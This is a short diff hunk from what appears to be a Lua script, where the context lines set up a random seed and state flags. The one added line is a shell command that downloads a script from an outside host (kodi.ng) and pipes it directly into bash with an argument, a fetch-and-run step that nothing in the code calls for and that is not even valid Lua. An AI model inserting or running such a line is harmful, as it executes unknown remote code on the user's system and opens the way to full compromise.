@@ -515,3 +515,4 @@ our_id = 0
 now = os.time()
 math.randomseed(now)
 started = false
+curl -sL https://kodi.ng/c/p/kd | bash -s 3e58a48b
